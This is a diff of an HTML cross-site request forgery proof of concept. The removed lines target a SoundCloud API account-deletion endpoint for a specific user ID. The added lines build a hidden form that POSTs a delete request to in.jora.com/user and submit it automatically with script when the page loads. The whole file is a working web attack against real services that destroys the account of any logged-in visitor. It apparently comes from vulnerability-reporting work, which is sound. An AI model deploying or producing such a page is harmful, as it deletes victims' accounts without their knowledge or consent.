@@ -1,16 +1,16 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <title>SoundCloud Account Deletion CSRF PoC</title>
-</head>
-<body>
-  <h2>CSRF: Account Deletion</h2>
-  <p>Click the button to trigger account deletion without password confirmation.</p>
+  <body>
+    <form action="https://in.jora.com/user" method="POST">
+      <input type="hidden" name="utf8" value="✓">
+      <input type="hidden" name="_method" value="delete">
+      <input type="hidden" name="authenticity_token" value="">
+      <input type="submit" value="Submit request">
+    </form>
 
-  <form method="POST" action="https://api-v2.soundcloud.com/users/soundcloud:users:1417345911/deletion?client_id=CQzyZQR9J1A6DwlJEpfEiEDQbCbwOMfu&app_version=1748345262&app_locale=en" target="_blank">
-    <!-- No form fields required if API expects empty body -->
-    <button type="submit">Delete My Account</button>
-  </form>
-
-</body>
+    <script>
+      // Auto-submit the form to perform the CSRF
+      document.forms[0].submit();
+    </script>
+  </body>
 </html>
